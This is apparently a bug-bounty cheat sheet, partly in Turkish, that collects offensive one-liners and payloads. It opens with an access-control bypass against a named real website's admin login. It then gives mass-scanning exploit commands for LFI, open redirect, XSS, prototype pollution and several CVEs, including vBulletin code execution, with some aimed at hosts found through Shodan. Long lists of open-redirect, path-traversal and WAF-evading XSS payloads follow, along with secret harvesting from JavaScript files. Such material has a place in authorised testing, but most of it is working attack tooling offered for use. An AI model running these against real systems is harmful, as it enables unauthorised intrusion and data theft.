subfinder -d {hedef} -active -o subdomains.txt -all && cat subdomains.txt  | sort -u > all_subdomains.txt && cat all_subdomains.txt | dnsx -silent -a -resp-only | sort -u > dnsx.txt && cat all_subdomains.txt dnsx.txt > subs-hosts.txt && httprobe -c 100 < subs-hosts.txt > alive.txt && httpx -l subs-hosts.txt -o httpx.txt -dashboard
```


This request shows normal behavior
curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' $'https://account.mackeeper.com/admin/login'
and returns 403
Here you can see how we can bypass these restrictions
curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' -H $'X-rewrite-url: admin/login' $'https://account.mackeeper.com/'
and return login page













### Local File Inclusion
> @dwisiswant0

gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
### Open-redirect
> @dwisiswant0

export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
> @N3T_hunt3r
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
### XSS
> @cihanmehmet

gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
> @fanimalikhack

waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
> @oliverrickfors

cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
### Prototype Pollution
> @R0X4R

subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
### CVE-2020-5902
> @Madrobot_

shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
### CVE-2020-3452
> @vict0ni

while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
### CVE-2022-0378
> @7h3h4ckv157

cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
> @Madrobot_

shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
### Find JavaScript Files



### error based sqli dork
you can try this dork to find error based sqli:
```
site:testphp.vulnweb.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"
```

### best dirsearch command for directory brute:
dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1




### openredirect Bypass:
```
1. Null-byte injection:
   - /google.com%00/
   - //google.com%00
  
2. Base64 encoding variations:
   - aHR0cDovL2dvb2dsZS5jb20=
   - aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==
   - //base64:d3d3Lmdvb2dsZS5jb20=/
  
3. Case-sensitive variations:
   - //GOOGLE.com/
   - //GoOgLe.com/

4. Overlong UTF-8 sequences:
   - %C0%AE%C0%AE%2F (overlong encoding for ../)
   - %C0%AF%C0%AF%2F%2Fgoogle.com

5. Mixed encoding schemes:
   - /%68%74%74%70://google.com
   - //base64:%32%46%32%46%67%6F%6F%67%6C%65%2E%63%6F%6D
   - //base64:%2F%2Fgoogle.com/

6. Alternative domain notations:
   - //google.com@127.0.0.1/
   - //127.0.0.1.xip.io/
   - //0x7F000001/ (hexadecimal IP)

7. Trailing special characters:
   - //google.com/#/
   - //google.com/;&/
   - //google.com/?id=123&//

8. Octal IP address format:
   - http://0177.0.0.1/
   - http://00177.0000.0000.0001/

9. IP address variants:
   - http://3232235777 (decimal notation of an IP)
   - http://0xC0A80001 (hex notation of IP)
   - http://192.168.1.1/

10. Path traversal with encoding:
    - /..%252f..%252f..%252fetc/passwd
    - /%252e%252e/%252e%252e/%252e%252e/etc/passwd
    - /..%5c..%5c..%5cwindows/system32/cmd.exe

11. Alternate protocol inclusion:
    - ftp://google.com/
    - javascript:alert(1)//google.com

12. Protocol-relative URLs:
    - :////google.com/
    - :///google.com/

13. Redirection edge cases:
    - //google.com/?q=//bing.com/
    - //google.com?q=https://another-site.com/

14. IPv6 notation:
    - http://[::1]/
    - http://[::ffff:192.168.1.1]/
    
15. Double URL encoding:
    - %252f%252fgoogle.com (encoded twice)
    - %255cgoogle.com

16. Combined traversal & encoding:
    - /%2E%2E/%2E%2E/etc/passwd
    - /%2e%2e%5c%2e%2e/etc/passwd

17. Reverse DNS-based:
    - https://google.com.reverselookup.com
    - //lookup-reversed.google.com/

18. Non-standard ports:
    - http://google.com:81/
    - https://google.com:444/

19. Unicode obfuscation in paths:
    - /%E2%80%8Egoogle.com/
    - /%C2%A0google.com/

20. Query parameters obfuscation:
    - //google.com/?q=http://another-site.com/
    - //google.com/?redirect=https://google.com/

21. Using @ symbol for userinfo:
    - https://admin:password@google.com/
    - http://@google.com

22. Combination of userinfo and traversal:
    - https://admin:password@google.com/../../etc/passwd
```


XSS Bypass Payloadları

    Etiket Kırma (Tag Breaking) Payload'ları:

    html

"><script>alert(1)</script>
\"><script>alert(1)</script>
</a><script>alert(1)</script>

Attribute Injection Payload'ları:

html

" autofocus onfocus=alert(1) "
" onmouseover=alert(1) "
" onerror=alert(1) "

HTML Comment Injection (Yorum Satırı ile Kırma):

html

--><script>alert(1)</script><!--

URL Scheme Manipulation (WAF'i atlatabilecek alternatif protokoller):

    Base64 Encoded Payload:

    html

<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click me</a>

javascript: Scheme Obfuscation:

html

<a href="javascript:/*-/*`/*`/*\x0A\x0D\x0A\x0Dalert(1)//">Click me</a>

SVG ile XSS Payload:

html

<a href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">Click me</a>

CSS Tabanlı XSS Payload:

html

    <a href="data:text/css;base64,Ym9keSB7YmFja2dyb3VuZC1pbWFnZTogdXJsKGphdmFzY3JpcHQ6YWxlcnQoMSkpO30=">Click me</a>

Hexadecimal veya Unicode Kaçış:

html

&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

JavaScript Obfuscation:

    String.fromCharCode kullanımı:

    javascript

        <script>alert(String.fromCharCode(88,83,83))</script>

Gelişmiş WAF Bypass ve Etiket Kırma Teknikleri

    Noktalı Virgül ile Kaçış: Noktalı virgül (;) bazı WAF'leri atlatabilir. Bununla tarayıcının kodu farklı yorumlamasını sağlayabilirsiniz.

    html

" onmouseover="alert(1);

Null Byte Injection: Bazı sistemlerde, null karakteri (ASCII kod 0) WAF'i yanıltabilir. Özellikle PHP tabanlı sistemlerde işe yarayabilir.

html

\x00"><script>alert(1)</script>

JavaScript Event Obfuscation (Hex Kod ile): Tarayıcıların desteklediği çeşitli JavaScript event'leri hex formatında yazabilirsiniz.

html

<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>

Entity Encoded Kaçış: HTML entity kodlaması ile JavaScript kodunu gizlemeye çalışabilirsiniz.

html

&lt;script&gt;alert(1)&lt;/script&gt;

Kendi Attribute Eklemek: HTML içinde yansıtılan attribute'ların içine yeni bir attribute ekleyerek payload'unuzu çalıştırabilirsiniz.

html

"style="x:expression(alert(1))

svg Tabanlı XSS: SVG etiketlerinin genellikle tarayıcılar tarafından tam olarak denetlenmemesi nedeniyle XSS fırsatları sunabilir.

html

<svg onload=alert(1)>

CSS Injection (WAF'i atlatan): CSS dosyası içindeki JavaScript çağrısı, bazı WAF'ler tarafından gözden kaçırılabilir.

css

body { background-image: url("javascript:alert(1)"); }

DOM Tabanlı XSS (Sunucuya Değil Tarayıcıya Yönelik Saldırı): Bazı durumlarda, DOM'daki JavaScript manipülasyonları filtrelenmez. Bu yüzden XSS'iniz DOM üzerinden tetiklenebilir.

javascript

<script>
  var input = window.location.hash.substring(1);
  document.write("<h1>" + input + "</h1>");
</script>

Daha Karmaşık Kaçışlar ve Diziler: Eğer WAF'in filtreleme mekanizması çok sıkıysa, kodunuzu parçalara bölerek çalıştırabilirsiniz.

html

<img src=x onerror='window '>

Unicode Alternatifleri ile WAF'i Atlatma: Tarayıcılar Unicode karakterleri çözerken WAF'ler bazı durumlarda bunu algılayamaz.

html

<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>



### url list to extract possible xss urls
cat wayback.txt | Gxss | kxss | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > xss.txt

### url list to extract possible open redirect
cat wayback.txt | gf or | sed 's/=.*/=/' | sort -u > open_redirect.txt

### dalfox url list test
dalfox file urls.txt --mining-dict --waf-evasion --skip-mining-dom


### url list .js url extract
grep '\.js.*' wayback.txt > js_urls.txt

## urldedupe
cat js_urls.txt | urldedupe > js.txt

### secter key finder with SecretFinder
cat js.txt |  while read url; do secretfinder -i $url -o cli; done

https://github.com/0xlittleboy/One-Liners
https://github.com/XalfiE/Bug-Bounty-Oneliners
https://github.com/daffainfo/Oneliner-Bugbounty
https://github.com/twseptian/oneliner-bugbounty
https://github.com/dwisiswant0/awesome-oneliner-bugbounty
https://github.com/Elsfa7-110/Elsfa7110-Oneliner-bughunting
https://github.com/t31m0/awesome-oneliner-bugbounty
https://thevillagehacker.gitbook.io/one-liners-for-bug-bounty-hunting





https://www.youtube.com/watch?v=UIqyZHNS-8s
